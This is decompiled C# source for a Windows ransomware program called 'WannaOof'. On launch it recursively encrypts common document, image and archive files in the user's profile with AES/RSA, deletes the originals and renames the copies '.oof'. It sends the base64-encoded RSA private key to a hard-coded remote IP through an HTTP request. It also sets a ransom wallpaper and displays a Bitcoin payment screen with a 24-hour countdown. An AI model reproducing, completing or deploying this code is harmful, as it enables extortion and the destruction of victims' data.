#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using inconspicuous.Properties;

namespace inconspicuous;

public class Form1 : Form
{
	public enum PicturePosition
	{
		Tile,
		Center,
		Stretch,
		Fit,
		Fill
	}

	public enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	[CompilerGenerated]
	private sealed class Class0
	{
		public Form1 form1_0;

		public int int_0;

		public DateTime dateTime_0;

		internal void method_0(object sender, EventArgs e)
		{
			((Control)form1_0.label3).set_Text((TimeSpan.FromMinutes(int_0) - (DateTime.Now - dateTime_0)).ToString("hh\\:mm\\:ss"));
		}
	}

	private const bool bool_0 = true;

	private const int int_0 = 20;

	private const int int_1 = 1;

	private const int int_2 = 2;

	private CspParameters cspParameters_0 = new CspParameters();

	private RSACryptoServiceProvider rsacryptoServiceProvider_0;

	private const string string_0 = "c:\\Encrypt\\";

	private const string string_1 = "c:\\Decrypt\\";

	private const string string_2 = "c:\\docs\\";

	private const int int_3 = 1440;

	private static string[] string_3 = new string[18]
	{
		".doc", ".docx", ".pdf", ".xls", ".ppt", ".pptx", ".zip", ".7zip", ".rar", ".fbx",
		".png", ".jpg", ".gif", ".txt", ".cad", ".psd", ".tiff", ".rtf"
	};

	private static string[] string_4 = new string[1] { ".oof" };

	private const string string_5 = "c:\\keys\\rsaPublicKey.txt";

	private const string string_6 = "Key01";

	private IContainer icontainer_0 = null;

	private OpenFileDialog openFileDialog_0;

	private Button button2;

	private OpenFileDialog openFileDialog_1;

	private TextBox textBox1;

	private Label label1;

	private Label label2;

	private Label label3;

	private TextBox textBox2;

	private TextBox textBox3;

	private Label label4;

	private PictureBox pictureBox1;

	private Button button1;

	[DllImport("user32.dll")]
	private static extern int SystemParametersInfo(int int_4, int int_5, string string_7, int int_6);

	public Form1()
	{
		InitializeComponent();
	}

	private void method_0()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		Debug.Print(folderPath);
		method_3(folderPath, bool_1: false);
	}

	private void method_1()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		Debug.Print(folderPath);
		logMsg("Attempting to decrypt files with key: " + encodeKey(rsacryptoServiceProvider_0.ToXmlString(includePrivateParameters: true)));
		method_3(folderPath, bool_1: true);
	}

	public static void setBackground(Image image_0, Style style)
	{
		string text = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
		image_0.Save(text, ImageFormat.get_Bmp());
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		if (style == Style.Stretched)
		{
			registryKey.SetValue("WallpaperStyle", 2.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
		}
		if (style == Style.Centered)
		{
			registryKey.SetValue("WallpaperStyle", 1.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
		}
		if (style == Style.Tiled)
		{
			registryKey.SetValue("WallpaperStyle", 1.ToString());
			registryKey.SetValue("TileWallpaper", 1.ToString());
		}
		SystemParametersInfo(20, 0, text, 3);
	}

	private void method_2(string string_7, bool bool_1)
	{
		if (bool_1)
		{
			if (Path.GetExtension(string_7) == ".oof")
			{
				Debug.Print("Decrypting: " + string_7);
				logMsg("[+] Decrypting file: " + string_7);
				method_11(string_7);
			}
		}
		else if (string_3.Contains<string>(Path.GetExtension(string_7)))
		{
			Debug.Print("Encrypting: " + string_7);
			method_5(string_7);
		}
	}

	private void method_3(string string_7, bool bool_1)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		List<string> list = new List<string>();
		list.Add(folderPath + "\\.");
		list.Add(folderPath + "\\AppData");
		string text = list.Aggregate("", (string string_0, string string_1) => (string_0.Length > string_1.Length) ? string_0 : string_1);
		string[] files = Directory.GetFiles(string_7);
		foreach (string string_8 in files)
		{
			method_2(string_8, bool_1);
		}
		string[] directories = Directory.GetDirectories(string_7);
		foreach (string text2 in directories)
		{
			if (text2.Length <= text.Length)
			{
				if (!list.Contains(text2) && !text2.Contains(list[0]))
				{
					try
					{
						method_3(text2, bool_1);
					}
					catch
					{
					}
				}
			}
			else if (!text2.Contains(list[0]))
			{
				try
				{
					method_3(text2, bool_1);
				}
				catch
				{
				}
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_10();
		method_6();
		method_0();
		method_8();
		Image oof_img = (Image)(object)Resources.oof_img;
		setBackground(oof_img, Style.Centered);
		method_4(1440);
	}

	private void method_4(int int_4)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		DateTime dateTime_0 = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label3).set_Text((TimeSpan.FromMinutes(int_4) - (DateTime.Now - dateTime_0)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
	}

	private void method_5(string string_7)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 256;
		rijndaelManaged.Mode = CipherMode.CBC;
		ICryptoTransform transform = rijndaelManaged.CreateEncryptor();
		byte[] array = rsacryptoServiceProvider_0.Encrypt(rijndaelManaged.Key, fOAEP: false);
		byte[] array2 = new byte[4];
		byte[] array3 = new byte[4];
		int num = array.Length;
		array2 = BitConverter.GetBytes(num);
		int num2 = rijndaelManaged.IV.Length;
		array3 = BitConverter.GetBytes(num2);
		_ = string_7.LastIndexOf("\\") + 1;
		Path.GetExtension(string_7);
		string path = string_7 + ".oof";
		using (FileStream fileStream = new FileStream(path, FileMode.Create))
		{
			fileStream.Write(array2, 0, 4);
			fileStream.Write(array3, 0, 4);
			fileStream.Write(array, 0, num);
			fileStream.Write(rijndaelManaged.IV, 0, num2);
			using (CryptoStream cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write))
			{
				int num3 = 0;
				int num4 = 0;
				int num5 = rijndaelManaged.BlockSize / 8;
				byte[] buffer = new byte[num5];
				int num6 = 0;
				using (FileStream fileStream2 = new FileStream(string_7, FileMode.Open))
				{
					do
					{
						num3 = fileStream2.Read(buffer, 0, num5);
						num4 += num3;
						cryptoStream.Write(buffer, 0, num3);
						num6 += num5;
					}
					while (num3 > 0);
					fileStream2.Close();
				}
				cryptoStream.FlushFinalBlock();
				cryptoStream.Close();
			}
			fileStream.Close();
		}
		File.Delete(string_7);
	}

	private void method_6()
	{
		string text = encodeKey(rsacryptoServiceProvider_0.ToXmlString(includePrivateParameters: true));
		logMsg("[+] Encoded key: " + text);
		method_7(text);
	}

	private void method_7(string string_7)
	{
		string requestUriString = "http://13.211.21.31/key.php?value=" + string_7;
		WebRequest webRequest = WebRequest.Create(requestUriString);
		Stream responseStream = webRequest.GetResponse().GetResponseStream();
		new StreamReader(responseStream);
	}

	private void method_8()
	{
		rsacryptoServiceProvider_0.Clear();
		method_10();
	}

	private void method_9(string string_7)
	{
		logMsg("[+] Importing key: " + string_7);
		cspParameters_0.KeyContainerName = "Key01";
		rsacryptoServiceProvider_0 = new RSACryptoServiceProvider(cspParameters_0);
		string text = decodeKey(string_7);
		logMsg("[+] Decoded key as: " + text);
		rsacryptoServiceProvider_0.FromXmlString(text);
		rsacryptoServiceProvider_0.PersistKeyInCsp = true;
		if (rsacryptoServiceProvider_0.PublicOnly)
		{
			Debug.Print("Imported Key: " + cspParameters_0.KeyContainerName + " - Public Only");
			logMsg("[+] Imported public key only");
		}
		else
		{
			Debug.Print("Imported Key: " + cspParameters_0.KeyContainerName + " - Full Key Pair");
			logMsg("[+] Imported full key pair");
		}
	}

	private void method_10()
	{
		cspParameters_0.KeyContainerName = "Key01";
		rsacryptoServiceProvider_0 = new RSACryptoServiceProvider(cspParameters_0);
		rsacryptoServiceProvider_0.PersistKeyInCsp = false;
		if (rsacryptoServiceProvider_0.PublicOnly)
		{
			Debug.Print("Key: " + cspParameters_0.KeyContainerName + " - Public Only");
		}
		else
		{
			Debug.Print("Key: " + cspParameters_0.KeyContainerName + " - Full Key Pair");
		}
	}

	public static bool validateKey(string string_7)
	{
		string_7 = string_7.Trim();
		return string_7.Length % 4 == 0 && Regex.IsMatch(string_7, "^[a-zA-Z0-9\\+/]*={0,3}$", RegexOptions.None);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox3).get_Text();
		if (text == null || text == "" || !validateKey(text))
		{
			MessageBox.Show("Key is invalid.");
			return;
		}
		logMsg("[+] Decrypt files selected...");
		method_9(text);
		logMsg("[-] Given key is: " + text);
		method_1();
		logDump();
	}

	private void method_11(string string_7)
	{
		Debug.Print("Decrypt inFile = " + string_7);
		logMsg("[+] Attempting to decrypt file: " + string_7);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 256;
		rijndaelManaged.Mode = CipherMode.CBC;
		byte[] array = new byte[4];
		byte[] array2 = new byte[4];
		string text = string_7.Substring(0, string_7.LastIndexOf("."));
		Debug.Print("outFile= " + text);
		logMsg("[+] Outputting file as: " + text);
		using (FileStream fileStream = new FileStream(string_7, FileMode.Open))
		{
			logMsg("[-] Filestream set up");
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Read(array, 0, 3);
			fileStream.Seek(4L, SeekOrigin.Begin);
			fileStream.Read(array2, 0, 3);
			int num = BitConverter.ToInt32(array, 0);
			int num2 = BitConverter.ToInt32(array2, 0);
			int num3 = num + num2 + 8;
			_ = (int)fileStream.Length - num3;
			byte[] array3 = new byte[num];
			byte[] array4 = new byte[num2];
			fileStream.Seek(8L, SeekOrigin.Begin);
			fileStream.Read(array3, 0, num);
			fileStream.Seek(8 + num, SeekOrigin.Begin);
			fileStream.Read(array4, 0, num2);
			Directory.CreateDirectory("c:\\Decrypt\\");
			byte[] rgbKey = rsacryptoServiceProvider_0.Decrypt(array3, fOAEP: false);
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(rgbKey, array4);
			logMsg("[-] Configuring output filestream");
			using (FileStream fileStream2 = new FileStream(text, FileMode.Create))
			{
				logMsg("[-] Output file stream configured");
				Debug.Print("debug02****");
				int num4 = 0;
				int num5 = 0;
				int num6 = rijndaelManaged.BlockSize / 8;
				byte[] buffer = new byte[num6];
				fileStream.Seek(num3, SeekOrigin.Begin);
				logMsg("[+] Starting cryptostream");
				using (CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write))
				{
					logMsg("[-] Cryptostream started");
					do
					{
						num4 = fileStream.Read(buffer, 0, num6);
						num5 += num4;
						cryptoStream.Write(buffer, 0, num4);
					}
					while (num4 > 0);
					cryptoStream.FlushFinalBlock();
					cryptoStream.Close();
				}
				fileStream2.Close();
			}
			fileStream.Close();
		}
		File.Delete(string_7);
		logMsg("[+] Decryption completed for: " + string_7);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		string text = "\u00af\\_(ツ)_/\u00af";
		MessageBox.Show(text, "??");
	}

	public static void GenerateRsa(string privateKeyPath, string publicKeyPath, int size)
	{
		FileStream fileStream = null;
		StreamWriter streamWriter = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(size);
		try
		{
			fileStream = new FileStream(privateKeyPath, FileMode.Create, FileAccess.Write);
			streamWriter = new StreamWriter(fileStream);
			streamWriter.Write(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
			streamWriter.Flush();
		}
		finally
		{
			streamWriter?.Close();
			fileStream?.Close();
		}
		try
		{
			fileStream = new FileStream(publicKeyPath, FileMode.Create, FileAccess.Write);
			streamWriter = new StreamWriter(fileStream);
			streamWriter.Write(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false));
			streamWriter.Flush();
		}
		finally
		{
			streamWriter?.Close();
			fileStream?.Close();
		}
		rSACryptoServiceProvider.Clear();
	}

	public static void logMsg(string string_7)
	{
		using StreamWriter textWriter_ = File.AppendText("log.txthmm");
		Log(string_7, textWriter_);
	}

	public static void logDump()
	{
		using StreamReader streamReader_ = File.OpenText("log.txthmm");
		DumpLog(streamReader_);
	}

	public static void Log(string logMessage, TextWriter textWriter_0)
	{
		textWriter_0.Write("\r\nLog Entry : ");
		textWriter_0.WriteLine(DateTime.Now.ToLongTimeString() + " " + DateTime.Now.ToLongDateString());
		textWriter_0.WriteLine("  :");
		textWriter_0.WriteLine("  :" + logMessage);
		textWriter_0.WriteLine("-------------------------------");
	}

	public static void DumpLog(StreamReader streamReader_0)
	{
		string value;
		while ((value = streamReader_0.ReadLine()) != null)
		{
			Console.WriteLine(value);
		}
	}

	public string encodeKey(string input)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
	}

	public string decodeKey(string input)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(input));
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e3: Expected O, but got Unknown
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_0372: Expected O, but got Unknown
		//IL_03f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0402: Expected O, but got Unknown
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a9: Expected O, but got Unknown
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_052c: Expected O, but got Unknown
		//IL_0593: Unknown result type (might be due to invalid IL or missing references)
		//IL_059d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		openFileDialog_0 = new OpenFileDialog();
		button2 = new Button();
		openFileDialog_1 = new OpenFileDialog();
		textBox1 = new TextBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		textBox2 = new TextBox();
		textBox3 = new TextBox();
		label4 = new Label();
		pictureBox1 = new PictureBox();
		button1 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((FileDialog)openFileDialog_0).set_FileName("openFileDialog1");
		((Control)button2).set_Location(new Point(667, 407));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(121, 31));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("Decrypt");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((FileDialog)openFileDialog_1).set_FileName("openFileDialog2");
		((Control)textBox1).set_BackColor(Color.DarkRed);
		((Control)textBox1).set_Font(new Font("Comic Sans MS", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.Window);
		((Control)textBox1).set_Location(new Point(121, 55));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(667, 346));
		((Control)textBox1).set_TabIndex(2);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Comic Sans MS", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.Menu);
		((Control)label1).set_Location(new Point(219, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(414, 40));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("YOU HAVE BEEN OOF'ED!!!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Yellow);
		((Control)label2).set_Location(new Point(6, 389));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(109, 18));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Time left to Pay:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Comic Sans MS", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(3, 407));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(125, 35));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("23:59:59");
		label3.set_TextAlign((ContentAlignment)32);
		((Control)textBox2).set_BackColor(Color.DarkRed);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.White);
		((Control)textBox2).set_Location(new Point(0, 237));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(121, 126));
		((Control)textBox2).set_TabIndex(6);
		((Control)textBox2).set_Text("Address:\r\n123456789");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_Location(new Point(121, 407));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(540, 31));
		((Control)textBox3).set_TabIndex(7);
		((Control)textBox3).set_Text("Decryption Key...");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Comic Sans MS", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(4, 204));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(106, 30));
		((Control)label4).set_TabIndex(8);
		((Control)label4).set_Text("Payment:");
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(0, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(121, 113));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(9);
		pictureBox1.set_TabStop(false);
		((Control)button1).set_Location(new Point(0, 363));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(121, 23));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("How to buy Bitcoin");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("WannaOof");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
